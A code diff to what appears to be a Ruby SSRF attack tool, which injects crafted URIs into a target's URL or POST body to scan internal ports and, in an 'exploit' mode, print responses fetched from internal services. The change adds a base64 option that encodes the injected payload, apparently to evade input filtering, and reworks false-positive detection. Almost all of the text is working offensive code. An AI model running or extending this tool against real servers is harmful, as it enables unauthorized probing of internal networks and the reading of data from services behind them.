@@ -4,6 +4,7 @@ require 'typhoeus' # Dependency
 require 'netaddr'  # Dependency
 require 'uri'
 require 'optparse'
+require 'base64'
 require_relative './lib/ports.rb'
 
 options = {}
@@ -34,6 +35,10 @@ OptionParser.new do |opts|
 
   opts.on("--regex REGEX", "[Optional] String to identify false results (in case target always returns 200 OK)") do |d|
     options[:regex] = d
+  end
+
+  opts.on("--base64", "Encode payload in base64") do |d|
+    options[:base64] = true
   end
 
   opts.on("-h", "--help", "Prints this help") do
@@ -78,12 +83,15 @@ def get_result(final_uri,http_method,body,mode,ssrf_uri,regex)
 
 	request.on_complete do |response|
 
-	  if response.success? && !response.response_body.include?(regex)
-	  	if mode == "exploit"
-	  		puts response.response_body
-	  	else
-	  		puts "[*] Found service on port: " + ssrf_uri
-	  	end
+	  if response.success? && response.response_body
+      if regex && response.response_body.include?(regex)
+      else
+  	  	if mode == "exploit"
+  	  		puts response.response_body
+  	  	else
+  	  		puts "[*] Found service on port: " + ssrf_uri
+  	  	end
+      end
 	  elsif response.timed_out?  
 	  	puts "[*] Found service on port: " + ssrf_uri
 	  elsif response.code == 0
@@ -129,7 +137,9 @@ if options[:target] then
 	target_port = target_uri.port
 
 	ssrf_uri = "#{target_prt}://#{target_host}:#{target_port}#{target_path}"
-
+  if options[:base64] then
+    ssrf_uri = Base64.encode64 ssrf_uri
+  end
 	if http_method == :get then
 		uri = URI(inject(options[:url],ssrf_uri))
 	elsif http_method == :post then
@@ -155,7 +165,9 @@ for i in 0..target_range.size-1 do
 
 	$ports.split(',').each do |target_port|
 		ssrf_uri = "#{target_prt}://#{target_host.to_s.split('/')[0]}:#{target_port}"
-
+    if options[:base64] then
+      ssrf_uri = Base64.encode64 ssrf_uri
+    end
 		if http_method == :get then
 			injected_uri = URI(inject(options[:url],ssrf_uri))
 		elsif http_method == :post then
